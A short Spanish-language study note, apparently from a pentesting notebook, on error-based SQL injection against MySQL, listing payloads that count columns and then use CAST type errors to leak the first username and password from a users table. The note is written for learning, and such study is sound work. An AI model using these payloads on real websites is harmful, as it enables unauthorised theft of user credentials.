# Inyección SQL Blind basado en errores visibles 

Tags: #SQLI #MySQL #BurpSuite 

```bash 
En este caso la página web muestra un error visible con la query, por lo que se puede aprovechar para mostrar contenido 
```

```mysql 
❯ ' order by 1 -- -         # Conocer el numero de columnas 
❯ ' union select NULL-- -   

# Cast convierte un tipo de dato a otro, por lo que el 1 es string y lo convertirá a entero
❯ ' or 1=cast((select 1) as INT)-- -

❯ ' or 1=cast((select username from users limit 1) as INT)-- -   # En el error se muestra el primer usuario 

❯ ' or 1=cast((select password from users limit 1) as INT)-- -    # En el error se muestra la password del primer usuario 
```